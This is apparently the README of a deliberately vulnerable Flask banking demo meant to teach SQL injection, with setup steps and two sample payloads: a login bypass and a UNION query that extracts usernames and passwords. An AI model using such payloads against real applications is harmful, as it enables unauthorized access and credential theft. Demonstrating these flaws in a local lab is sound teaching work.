# broke-bank
SQL injection demo

# Setup

1. Clone repository
```
git clone https://github.com/anilmawji/broke-bank.git; cd broke-bank
```

2. Create and activate virtual environment (optional, recommended)
```
python -m venv .venv      # Create virtual environment
source .venv/bin/activate # On macOS/Linux
.venv\Scripts\activate    # On Windows
```

2. Install dependencies
```
pip install -r requirements.txt
```

3. Start server (local deployment)
```
flask run
```

# SQL Injection Examples

Login form password (make sure to include the space at the end!)
```
a' or 1=1 -- 
```

Transaction history search bar
```
3' union select null, user_id, version(), username, user_password from users;
```
